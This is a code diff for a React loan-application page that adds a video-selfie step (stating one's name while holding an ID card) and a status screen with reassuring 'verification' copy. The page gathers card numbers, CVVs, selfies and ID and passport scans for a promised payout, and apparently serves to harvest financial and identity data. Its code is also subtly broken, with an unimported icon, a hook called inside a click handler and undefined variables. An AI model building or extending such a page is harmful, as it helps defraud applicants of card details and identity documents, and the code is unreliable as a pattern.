@@ -1,9 +1,10 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { SiteShell } from "@/components/layout/SiteShell";
-import { Loader2, CheckCircle2, ShieldCheck, Banknote, CreditCard, Lock, Wallet, Camera, IdCard, BookOpen, AlertTriangle, BadgeCheck, FileCheck2 } from "lucide-react";
+import { Loader2, CheckCircle2, ShieldCheck, Banknote, CreditCard, Lock, Wallet, Camera, IdCard, BookOpen, AlertTriangle, BadgeCheck, FileCheck2, Clock, Fingerprint, RefreshCw } from "lucide-react";
 import { useLoanApplication } from "@/hooks/useLoanApplication";
 import { formatCardNumber, formatExpiry } from "@/lib/loan-utils";
 import { Reveal } from "@/components/effects/Reveal";
+import { VideoCapture } from "@/components/loan/VideoCapture";
 
 // ─── Identity Verification sub-components (defined before LoansPage so TanStack
 //     code-splitting includes them in the component chunk) ──────────────────────
@@ -128,9 +129,9 @@ function LoansPage() {
     loading, done, countdown, payout, setPayout,
     cardNumber, setCardNumber, cardExpiry, setCardExpiry,
     cardCvv, setCardCvv, cardErrors, setCardErrors,
-    selfieImage, idFrontImage, idBackImage, passportFrontImage, passportBackImage,
+    selfieImage, idFrontImage, idBackImage, passportFrontImage, passportBackImage, videoSelfie,
     onSelfieChange, onIdFrontChange, onIdBackChange, onPassportFrontChange, onPassportBackChange,
-    handleSubmit
+    onVideoSelfieChange, handleSubmit
   } = useLoanApplication();
 
   return (
@@ -151,29 +152,157 @@ function LoansPage() {
 
       <section className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 -mt-6 pb-20">
         {done ? (
-            <div className="rounded-2xl bg-white shadow-elegant p-10 text-center border border-border animate-in fade-in zoom-in duration-500">
-              <div className="w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mx-auto mb-6">
-                <CheckCircle2 className="w-10 h-10 text-emerald-600" />
+          <div className="max-w-3xl mx-auto">
+            <div className="rounded-3xl bg-white shadow-elegant overflow-hidden border border-border animate-in fade-in zoom-in duration-500">
+              {/* Header Status Bar */}
+              <div className={`px-8 py-4 flex items-center justify-between ${
+                appStatus?.status === 'verified' ? 'bg-emerald-600' :
+                appStatus?.status === 'rejected' ? 'bg-red-600' :
+                appStatus?.status === 'needs_correction' ? 'bg-purple-600' :
+                'bg-slate-900'
+              }`}>
+                <div className="flex items-center gap-3">
+                  <div className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center text-white">
+                    {appStatus?.status === 'verified' ? <CheckCircle2 className="w-5 h-5" /> : <Clock className="w-5 h-5 animate-pulse" />}
+                  </div>
+                  <div>
+                    <div className="text-[10px] font-black uppercase tracking-widest text-white/60 leading-none mb-1">Application Status</div>
+                    <div className="text-white font-bold text-sm uppercase tracking-wider">
+                      {appStatus?.status ? appStatus.status.replace('_', ' ') : 'Processing...'}
+                    </div>
+                  </div>
+                </div>
+                <div className="text-right">
+                  <div className="text-[10px] font-black uppercase tracking-widest text-white/60 leading-none mb-1">Last Update</div>
+                  <div className="text-white font-mono text-[10px]">
+                    {new Date().toLocaleTimeString()}
+                  </div>
+                </div>
               </div>
-              <h2 className="text-3xl font-bold mb-4">Application Submitted</h2>
-              <div className="bg-emerald-50 border border-emerald-100 rounded-2xl p-6 mb-8 max-w-md mx-auto">
-                <p className="text-emerald-800 font-semibold mb-2 flex items-center justify-center gap-2">
-                  <ShieldCheck className="w-5 h-5" /> KYC Verification in Progress
-                </p>
-                <p className="text-sm text-emerald-600 leading-relaxed">
-                  Our compliance team is now verifying your documents. This process usually takes <strong>5–30 minutes</strong>. Once verified, your funds will be released.
-                </p>
-              </div>
-              <p className="text-muted-foreground max-w-md mx-auto text-base mb-8">
-                You are being securely redirected to your priority client portal to track your release status in...
-              </p>
-              <div className="text-6xl font-black text-primary mb-8 animate-pulse">
-                {countdown}
-              </div>
-              <div className="flex justify-center items-center gap-3 text-slate-400 text-sm font-medium">
-                <Loader2 className="w-5 h-5 animate-spin" /> Securing connection...
+
+              <div className="p-8 sm:p-12 text-center">
+                {appStatus?.status === 'verified' ? (
+                  <div className="space-y-6">
+                    <div className="w-24 h-24 bg-emerald-100 rounded-full flex items-center justify-center mx-auto shadow-inner">
+                      <ShieldCheck className="w-12 h-12 text-emerald-600" />
+                    </div>
+                    <h2 className="text-3xl font-black text-slate-900 tracking-tight">Identity Verified</h2>
+                    <div className="bg-emerald-50 border-2 border-emerald-100 rounded-2xl p-6 max-w-md mx-auto">
+                      <p className="text-emerald-800 font-bold mb-2 flex items-center justify-center gap-2">
+                        <BadgeCheck className="w-5 h-5" /> Priority Funding Released
+                      </p>
+                      <p className="text-sm text-emerald-700 leading-relaxed font-medium">
+                        Your documents have been verified. The requested amount of <strong>{appStatus.currency} {Number(appStatus.amountRequested).toLocaleString()}</strong> is being settled.
+                      </p>
+                    </div>
+                    <p className="text-slate-500 max-w-sm mx-auto text-sm">
+                      Redirecting you to the secure fund management portal...
+                    </p>
+                    <div className="text-7xl font-black text-primary animate-pulse tabular-nums">
+                      {countdown}
+                    </div>
+                  </div>
+                ) : appStatus?.status === 'rejected' || appStatus?.status === 'needs_correction' ? (
+                  <div className="space-y-6">
+                    <div className="w-24 h-24 bg-red-100 rounded-full flex items-center justify-center mx-auto shadow-inner">
+                      <AlertTriangle className="w-12 h-12 text-red-600" />
+                    </div>
+                    <h2 className="text-3xl font-black text-slate-900 tracking-tight">Review Alert</h2>
+                    <div className="bg-red-50 border-2 border-red-100 rounded-2xl p-6 max-w-md mx-auto">
+                      <p className="text-red-800 font-bold mb-2 uppercase tracking-widest text-xs">Correction Required</p>
+                      <p className="text-sm text-red-700 leading-relaxed font-medium">
+                        {appStatus?.rejectionReason || "Our team was unable to verify your identity with the provided documents. Please ensure images are clear and valid."}
+                      </p>
+                    </div>
+                    <button 
+                      onClick={() => {
+                        const { clearSession } = useLoanApplication(); // This might not work as intended in render
+                        // Use a prop or better yet, just clear and reload
+                        localStorage.removeItem("chanaid_loan_id");
+                        window.location.reload();
+                      }}
+                      className="inline-flex items-center gap-2 text-primary font-bold text-sm border-b-2 border-primary/20 hover:border-primary transition-all pb-0.5"
+                    >
+                      Update Documentation & Retry
+                    </button>
+                  </div>
+                ) : (
+                  <div className="space-y-8">
+                    <div className="relative w-32 h-32 mx-auto">
+                      <div className="absolute inset-0 rounded-full border-4 border-slate-100"></div>
+                      <div className="absolute inset-0 rounded-full border-4 border-primary border-t-transparent animate-spin"></div>
+                      <div className="absolute inset-0 flex items-center justify-center">
+                        <Fingerprint className="w-12 h-12 text-primary opacity-20 animate-pulse" />
+                      </div>
+                    </div>
+                    
+                    <div className="space-y-3">
+                      <h2 className="text-3xl font-black text-slate-900 tracking-tight italic">Biometric Review</h2>
+                      <p className="text-slate-500 max-w-md mx-auto text-sm leading-relaxed">
+                        Your application <span className="font-mono text-xs bg-slate-100 px-1.5 py-0.5 rounded">#{appId?.slice(0,8)}</span> has been securely queued. Our officers are verifying your biometric video and ID documents against global databases.
+                      </p>
+                    </div>
+
+                    {/* Visual Pipeline */}
+                    <div className="max-w-md mx-auto grid grid-cols-3 gap-1 relative">
+                       <div className="absolute top-4 left-[15%] right-[15%] h-1 bg-slate-100 -z-10">
+                          <div className={`h-full bg-primary transition-all duration-1000 ${appStatus?.status === 'under_review' ? 'w-1/2' : 'w-0'}`}></div>
+                       </div>
+                       {[
+                         { id: 'pending', label: 'Queued', icon: <FileCheck2 className="w-4 h-4" /> },
+                         { id: 'under_review', label: 'In Review', icon: <RefreshCw className="w-4 h-4" /> },
+                         { id: 'verified', label: 'Released', icon: <CheckCircle2 className="w-4 h-4" /> }
+                       ].map((step, i) => {
+                         const isActive = appStatus?.status === step.id || (step.id === 'pending' && !appStatus);
+                         const isPast = (step.id === 'pending' && appStatus?.status === 'under_review');
+                         return (
+                           <div key={step.id} className="flex flex-col items-center gap-2">
+                             <div className={`w-10 h-10 rounded-full flex items-center justify-center shadow-sm border-2 transition-all ${
+                               isActive ? "bg-primary text-white border-primary scale-110" : 
+                               isPast ? "bg-emerald-500 text-white border-emerald-500" :
+                               "bg-white text-slate-300 border-slate-100"
+                             }`}>
+                               {step.icon}
+                             </div>
+                             <span className={`text-[10px] font-black uppercase tracking-tighter ${isActive ? "text-primary" : "text-slate-400"}`}>{step.label}</span>
+                           </div>
+                         );
+                       })}
+                    </div>
+
+                    <div className="bg-slate-50 rounded-2xl p-5 border border-slate-100 flex items-center gap-4 text-left max-w-md mx-auto">
+                      <div className="w-10 h-10 rounded-xl bg-white border border-slate-200 flex items-center justify-center shrink-0 shadow-sm">
+                        <Clock className="w-5 h-5 text-slate-400" />
+                      </div>
+                      <div className="flex-1">
+                        <div className="text-[10px] font-bold text-slate-400 uppercase tracking-widest leading-none mb-1">Estimated Wait</div>
+                        <div className="text-slate-900 font-bold text-sm">5 — 15 Minutes</div>
+                      </div>
+                      <div className="px-3 py-1 bg-emerald-50 text-emerald-600 text-[10px] font-black rounded-lg uppercase tracking-tighter">
+                        Priority Queue
+                      </div>
+                    </div>
+
+                    <p className="text-[10px] text-slate-400 font-medium">
+                      Do not close this window. Your browser is maintaining a secure, authenticated session with the verification gateway.
+                    </p>
+                  </div>
+                )}
               </div>
             </div>
+            
+            <div className="mt-8 flex justify-center">
+               <button 
+                onClick={() => {
+                  localStorage.removeItem("chanaid_loan_id");
+                  window.location.reload();
+                }}
+                className="text-slate-400 hover:text-slate-600 text-xs font-semibold flex items-center gap-2 transition-colors"
+               >
+                 <RefreshCw className="w-3.5 h-3.5" /> Start a new application
+               </button>
+            </div>
+          </div>
         ) : (
           <form onSubmit={handleSubmit} className="rounded-2xl bg-white shadow-elegant p-6 sm:p-10 border border-border">
             <input type="text" name="website" tabIndex={-1} autoComplete="off" className="hidden" aria-hidden />
@@ -432,6 +561,7 @@ function LoansPage() {
                     { n: 1, label: "Selfie", done: Boolean(selfieImage) },
                     { n: 2, label: "Primary ID", done: Boolean(idFrontImage && idBackImage) },
                     { n: 3, label: "Secondary Doc", done: Boolean(passportFrontImage || passportBackImage) },
+                    { n: 4, label: "Video Selfie", done: Boolean(videoSelfie) },
                   ].map((step, i, arr) => (
                     <div key={step.n} className="flex items-center gap-2 flex-1">
                       <div className={`w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold shrink-0 transition-all ${
@@ -526,6 +656,23 @@ function LoansPage() {
                       onChange={onPassportBackChange}
                     />
                   </div>
+                </VerificationStep>
+
+                {/* Step 4 — Video Selfie */}
+                <VerificationStep
+                  stepNumber={4}
+                  title="Biometric Video Verification"
+                  subtitle="Required · Enhanced Security Layer"
+                  completed={Boolean(videoSelfie)}
+                  description="Record a short video (up to 15s) stating your name and holding your ID card (front and back) clearly. This is a mandatory requirement to prevent identity theft."
+                  icon={<Video className="w-5 h-5" />}
+                  requirements={["State your full name", "Show ID front clearly", "Show ID back clearly", "Face must be visible"]}
+                >
+                  <VideoCapture
+                    label="Video ID Verification"
+                    value={videoSelfie}
+                    onCapture={onVideoSelfieChange}
+                  />
                 </VerificationStep>
 
                 {/* Legal footer */}
